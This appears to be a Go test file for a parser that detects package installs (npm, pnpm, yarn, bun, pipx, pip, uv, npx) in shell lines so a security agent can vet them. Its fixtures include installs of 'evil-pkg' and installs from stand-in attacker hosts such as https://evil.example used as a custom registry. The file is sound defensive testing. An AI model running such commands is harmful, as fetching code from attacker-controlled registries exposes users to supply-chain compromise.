package installread

import (
	"slices"
	"strings"
	"testing"
)

// RT-1 round 3 (re-review R2-P2-1): everyday commands that install nothing are not read as installs, so the server
// acts on nothing in them and alalanet-agent sends none of them — pipx subcommands other than install, run, inject and
// runpip; uv python install; pnpm's, Yarn's and bun's exec (they fetch nothing: runnerVerbs); a read-only command
// behind xargs; an option's value that is spelled like a verb.
func TestRound3EverydayCommandsInstallNothing(t *testing.T) {
	for _, line := range []string{
		"pipx ensurepath", "pipx list", "pipx upgrade black", "pipx environment", "pipx uninstall black", "pipx reinstall-all",
		"pipx upgrade-all", "pipx completions", "pipx runpip black list", "pipx install-all spec.json",
		"uv python install 3.12", "uv python install", "uv --directory web python install 3.12",
		"pnpm exec tsc --noEmit", "pnpm exec my-local-tool --flag", "pnpm -r exec tsc", "pnpm --filter web exec next build",
		"pnpm -C web exec tsc", "yarn exec tsc", "yarn workspace web exec tsc", "bun exec ./build.sh",
		"npm i ./notes.txt", "npm i ../pkg.TGZ", "npm i x.tar", "npm i pkg.TGZ", "pip install ./dist/x-1.0-py3-none-any.whl", "pip install x.whl",
		"bun exec tsc", "bun exec 'echo hi'", "pnpm add --workspace my-lib", "pnpm --filter web add --workspace @acme/ui",
		"cat list.txt | xargs -I{} npm view {} version", "cat list.txt | xargs -n1 npm view", "xargs -n1 pip show",
		"npm --prefix x run build", "pnpm --filter exec run build", "npm -w x run build", "npm i --loglevel silent",
		"pnpm exec tsc --project $(pwd)/tsconfig.json",
	} {
		targets, unread, _, subst := parseInstallLineFull(line)
		if extra := hookExtra(line, targets, unread, subst); len(targets)+len(unread)+len(extra) > 0 {
			t.Errorf("%q installs nothing: targets %q, unread %q, extra %q", line, targets, unread, extra)
		}
	}
}

// The second reader agrees: an exec that fetches nothing is no install a wrapper runs unchecked (npx cross-env A=1
// pnpm exec tsc), where a runner is (pnpm dlx).
func TestRound3SecondReaderRunnerVerbs(t *testing.T) {
	for line, want := range map[string]bool{"npx cross-env A=1 pnpm exec tsc": false, "npx -y cross-env A=1 yarn exec tsc": false,
		"npx cross-env A=1 bun exec tsc": false, "npx cross-env A=1 pnpm dlx tsc": true, "npx cross-env A=1 npm exec tsc": true} {
		targets, unread, _, subst := parseInstallLineFull(line)
		extra := hookExtra(line, targets, unread, subst)
		if got := slices.ContainsFunc(extra, func(x string) bool { return strings.HasPrefix(x, "runs an install through npx cross-env") }); got != want {
			t.Errorf("%q: %q, want the wrapper's reason %v", line, extra, want)
		}
	}
}

// Every real install is still read, in the forms round 3 changed: pipx's installing subcommands read all their
// packages, a runner verb is each manager's own, an option's value is not a verb or a package (long or the manager's
// own short ones; two before the verb), pip's short options and registry flags are not npm's, xargs with an install
// form is held, and an archive at a URL is a URL package.
func TestRound3InstallsStillRead(t *testing.T) {
	for line, want := range map[string][]string{
		"pipx install black ruff":                              {"pypi:black", "pypi:ruff"},
		"pipx install --preinstall pkgdep black":               {"pypi:pkgdep", "pypi:black"},
		"pipx install --suffix @2 black":                       {"pypi:black"},
		"pipx --verbose install black":                         {"pypi:black"},
		"pipx -w x run evil-pkg":                               {"pypi:evil-pkg"},
		"pipx run --spec evil-pkg app --with dep":              {"pypi:evil-pkg", "pypi:dep"},
		"pipx run black --check .":                             {"pypi:black"},
		"pipx inject black requests rich":                      {"pypi:requests", "pypi:rich"},
		"pipx runpip black install evil-pkg":                   {"pypi:evil-pkg"},
		"uv pip install evil-pkg":                              {"pypi:evil-pkg"},
		"uv tool run evil-pkg":                                 {"pypi:evil-pkg"},
		"npm exec evil-pkg":                                    {"npm:evil-pkg"},
		"npm x evil-pkg":                                       {"npm:evil-pkg"},
		"bun x evil-pkg":                                       {"npm:evil-pkg"},
		"pnpm dlx evil-pkg":                                    {"npm:evil-pkg"},
		"yarn dlx evil-pkg":                                    {"npm:evil-pkg"},
		"npm -w x install evil-pkg":                            {"npm:evil-pkg"},
		"npm -C exec install evil-pkg":                         {"npm:evil-pkg"},
		"pnpm -F dlx add evil-pkg":                             {"npm:evil-pkg"},
		"pnpm -C exec add evil-pkg":                            {"npm:evil-pkg"},
		"npm --loglevel silent --prefix x install evil-pkg":    {"npm:evil-pkg"},
		"npm --loglevel silent --prefix exec install evil-pkg": {"npm:evil-pkg"},
		"pnpm --reporter silent -C dlx add evil-pkg":           {"npm:evil-pkg"},
		"npm i -f evil-pkg":                                    {"npm:evil-pkg"},
		"npm i -p evil-pkg":                                    {"npm:evil-pkg"},
		"pnpm add -w evil-pkg":                                 {"npm:evil-pkg"},
		"npm i --tag beta evil-pkg":                            {"npm:evil-pkg"},
		"npm i --index-url https://pypi.org/simple evil-pkg":   {"npm:evil-pkg"},
		"pip install -f ./wheels evil-pkg":                     {"pypi:evil-pkg"},
		"npm -w --reg x evil-pkg":                              {"npm:evil-pkg"}, // -w takes --reg; x is npm's exec
		// another tool's option is a switch to npm (nopt), and the word after it the package npm installs
		"npm i --cwd evil-pkg":                         {"npm:evil-pkg"},
		"npm i --filter evil-pkg":                      {"npm:evil-pkg"},
		"npm i --index-url evil-pkg":                   {"npm:evil-pkg"},
		"npm i --requirement evil-pkg":                 {"npm:evil-pkg"},
		"npm i --allow-git evil-pkg":                   {"npm:evil-pkg"}, // npm 11's option, a switch to npm 10
		"npm i --loglevel silent evil-pkg":             {"npm:evil-pkg"},
		"yarn add --cwd web evil-pkg":                  {"npm:evil-pkg"},
		"yarn --modules-folder m add evil-pkg":         {"npm:evil-pkg"},
		"bun add -F web evil-pkg":                      {"npm:evil-pkg"},
		"bun add --filter web evil-pkg":                {"npm:evil-pkg"},
		"pnpm add --filter web evil-pkg":               {"npm:evil-pkg"},
		"pnpm add evil-pkg --workspace-packages 'p/*'": {"npm:evil-pkg"},
		// npx reads npm's options; a bare .txt or .whl word is a registry name to npm (npm-package-arg)
		"npx --target evil-pkg":  {"npm:evil-pkg"},
		"npx -r evil-pkg":        {"npm:evil-pkg"},
		"npx evil.txt":           {"npm:evil.txt"},
		"npm i requirements.txt": {"npm:requirements.txt"},
		"bunx --filter evil-pkg": {"npm:evil-pkg"}, "bunx --cwd web evil-pkg": {"npm:evil-pkg"},
		"pnpx --filter web evil-pkg":                           {"npm:evil-pkg"},
		"pnpm add evil-pkg --filter --workspace":               {"npm:evil-pkg"}, // --filter takes it: no switch of pnpm's
		"npm --tag --registry https://e.example exec evil-pkg": {"npm:evil-pkg"},
	} {
		targets, _, _, _ := parseInstallLineFull(line)
		if !slices.Equal(targets, want) {
			t.Errorf("%q: targets %q, want %q", line, targets, want)
		}
	}
	const stdin = "install arguments come from standard input (xargs) alalanet cannot see"
	for _, line := range []string{"xargs npm i", "cat list | xargs -I{} pip install {}", "xargs npx", "xargs -n1 pipx install",
		"echo x | xargs npm", "xargs pnpm -C dir"} {
		if _, unread, _, _ := parseInstallLineFull(line); !slices.Contains(unread, stdin) {
			t.Errorf("%q: unread %q, want the standard-input reason", line, unread)
		}
	}
	for _, line := range []string{"npm i https://e.example/p.tgz", "pip install https://e.example/p-1.0-py3-none-any.whl",
		"yarn dlx https://e.example/p.tgz"} {
		if _, unread, _, _ := parseInstallLineFull(line); !slices.ContainsFunc(unread, func(u string) bool { return strings.HasPrefix(u, "installs a git or URL package") }) {
			t.Errorf("%q: unread %q, want a URL package", line, unread)
		}
	}
	// A registry option before or after the subcommand is a reason the production reader gives (pipx; npm's --reg
	// and the abbreviations npm expands; before the verb, which only the second reader saw, and only --registry)
	for _, line := range []string{"pipx --index-url https://evil.example/simple install black", "npm --reg https://evil.example install x",
		"npm i --reg=https://evil.example x", "npm --regis https://evil.example install x", "npm --registr=https://evil.example exec x",
		"pnpm --registry https://evil.example add x", "yarn --registry=https://evil.example dlx x", "npm --regi https://evil.example init vite",
		"npm init --regist=https://evil.example vite", "npm -w web --registry https://evil.example i x",
		"npm --tag --registry https://evil.example exec x"} { // in a value's place: nopt reads it as an option after --tag
		if _, unread, _, _ := parseInstallLineFull(line); !slices.ContainsFunc(unread, func(u string) bool { return strings.Contains(u, "evil.example") }) {
			t.Errorf("%q: unread %q, want the custom registry", line, unread)
		}
	}
	// … and not on a line that installs nothing, nor --re (read-only, rebuild-bundle, replace-registry-host), nor an
	// option whose "value" is the verb (npm -w --reg x: x is npm's exec)
	for _, line := range []string{"npm --registry https://evil.example run build", "npm --registry=https://evil.example run build",
		"npm --re x install y", "npm -w --reg x evil-pkg"} {
		if _, unread, _, _ := parseInstallLineFull(line); slices.ContainsFunc(unread, func(u string) bool { return strings.Contains(u, "evil.example") || strings.Contains(u, "(x)") }) {
			t.Errorf("%q: unread %q, want no registry", line, unread)
		}
	}
}

// pmTakesValue and pmFirstPositional read each manager's options as that manager does.
func TestRound3ManagersOptions(t *testing.T) {
	for _, c := range []struct {
		cmd, opt string
		want     bool
	}{
		{"npm", "-w", true}, {"npm", "-C", true}, {"npm", "-L", true}, {"npm", "-c", true}, {"npm", "-m", true},
		{"npm", "-f", false}, {"npm", "-p", false}, {"npm", "-D", false}, {"npm", "-g", false},
		{"pnpm", "-C", true}, {"pnpm", "-F", true}, {"pnpm", "-w", false}, {"pnpm", "-r", false},
		{"yarn", "-w", false}, {"yarn", "-C", false}, {"bun", "-c", true}, {"bun", "-w", false},
		{"npm", "--prefix", true}, {"npm", "--loglevel", true}, {"npm", "--reg", true}, {"npm", "--regist", true}, {"npm", "--re", false},
		{"npm", "--registryx", false}, {"npm", "--before", true},
		{"npm", "--filter", false}, {"pnpm", "--filter", true}, {"bun", "--filter", true}, {"npm", "--cwd", false},
		{"yarn", "--cwd", true}, {"bun", "--cwd", true}, {"pnpm", "--cwd", false}, {"npm", "--index-url", false},
		{"yarn", "--index-url", false}, {"npm", "--allow-git", false}, {"npm", "--enjoy-by", true}, {"npm", "--browser", true},
		{"bun", "-F", true}, {"yarn", "-F", false}, {"pnpm", "--workspace", false}, {"npm", "--workspace", true},
		{"npm", "--global", false}, {"npm", "--prefix=x", false}, {"npm", "-", false},
	} {
		if got := pmTakesValue(c.cmd, c.opt); got != c.want {
			t.Errorf("pmTakesValue(%s, %s) = %v", c.cmd, c.opt, got)
		}
	}
	for _, c := range []struct {
		cmd  string
		rest []string
		want int
	}{
		{"npm", []string{"-w", "web", "init", "vite"}, 2}, {"npm", []string{"--prefix", "x", "create"}, 2},
		{"pnpm", []string{"-w", "add", "x"}, 1}, {"npm", []string{"-g"}, -1}, {"npm", []string{"--", "x"}, 1}, {"npm", []string{"--"}, -1},
	} {
		if got := pmFirstPositional(c.cmd, c.rest); got != c.want {
			t.Errorf("pmFirstPositional(%s, %q) = %d, want %d", c.cmd, c.rest, got, c.want)
		}
	}
	if !ownSwitch("pnpm", []string{"add", "--workspace", "x"}, "--workspace") || ownSwitch("pnpm", []string{"add", "x", "--filter", "--workspace"}, "--workspace") ||
		ownSwitch("pnpm", []string{"add", "x", "--", "--workspace"}, "--workspace") {
		t.Error("ownSwitch")
	}
	if uvSubcommand([]string{"--directory", "web", "python", "install"}) != "python" || uvSubcommand([]string{"-q", "add", "x"}) != "add" || uvSubcommand([]string{"-q"}) != "" {
		t.Error("uvSubcommand")
	}
}
